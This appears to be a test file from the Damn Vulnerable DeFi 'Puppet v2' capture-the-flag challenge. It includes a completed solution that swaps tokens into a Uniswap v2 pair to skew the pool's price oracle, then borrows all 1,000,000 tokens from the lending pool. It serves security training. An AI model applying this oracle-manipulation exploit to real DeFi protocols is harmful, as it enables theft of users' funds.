const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
            
        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        getRequireAmount = async (amount) => {
            let requiredAmount = await lendingPool.calculateDepositOfWETHRequired(amount);
            console.log(`borrow ${ethers.utils.formatEther(amount)} DVT required amount: ${ethers.utils.formatEther(requiredAmount)} WETH`);
            return requiredAmount;
        }
        checkBalance = async () => {
            console.log(`--------`);
            console.log(`DVT.balance[player]   : ${ethers.utils.formatEther(await token.balanceOf(player.address))} DVT`);
            console.log(`DVT.balance[uniswap]  : ${ethers.utils.formatEther(await token.balanceOf(uniswapExchange.address))} DVT`);
            console.log(`DVT.balance[pool]     : ${ethers.utils.formatEther(await token.balanceOf(lendingPool.address))} DVT`);
            console.log(`WETH.balance[player]  : ${ethers.utils.formatEther(await weth.balanceOf(player.address))} WETH`);
            console.log(`WETH.balance[uniswap] : ${ethers.utils.formatEther(await weth.balanceOf(uniswapExchange.address))} WETH`);
            console.log(`WETH.balance[pool]    : ${ethers.utils.formatEther(await weth.balanceOf(lendingPool.address))} WETH`);
            console.log(`--------`);
        }

        console.log(`ETH.balance[player]: ${ethers.utils.formatEther(await ethers.provider.getBalance(player.address))} ETH`);
        console.log(`Wrapping ETH...`);
        let playerETH = ethers.utils.parseEther("19.9");
        await weth.connect(player).deposit({value: playerETH});
        await checkBalance();
        let borrowAmount = await token.balanceOf(lendingPool.address);
        await getRequireAmount(borrowAmount);

        console.log(`Swapping WETH to DVT...`);
        ///// https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#swapexacttokensfortokens
        let exactAmountIn = await token.balanceOf(player.address);
        let deadline = parseInt((await ethers.provider.getBlock('latest')).timestamp) + 1000;
        let amountOutmin = 0;
        await token.connect(player).approve(uniswapRouter.address, exactAmountIn);
        await uniswapRouter.connect(player).swapExactTokensForTokens(
            exactAmountIn,
            amountOutmin,
            [token.address, weth.address],
            player.address,
            deadline
        );
        await checkBalance();
        
        console.log(`Borrowing lending pool...`);
        let requiredAmount = await getRequireAmount(borrowAmount);
        console.log(`requiredAmount: ${ethers.utils.formatEther(requiredAmount)} WETH`);
        await weth.connect(player).approve(lendingPool.address, requiredAmount);
        await lendingPool.connect(player).borrow(borrowAmount);
        await checkBalance();
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});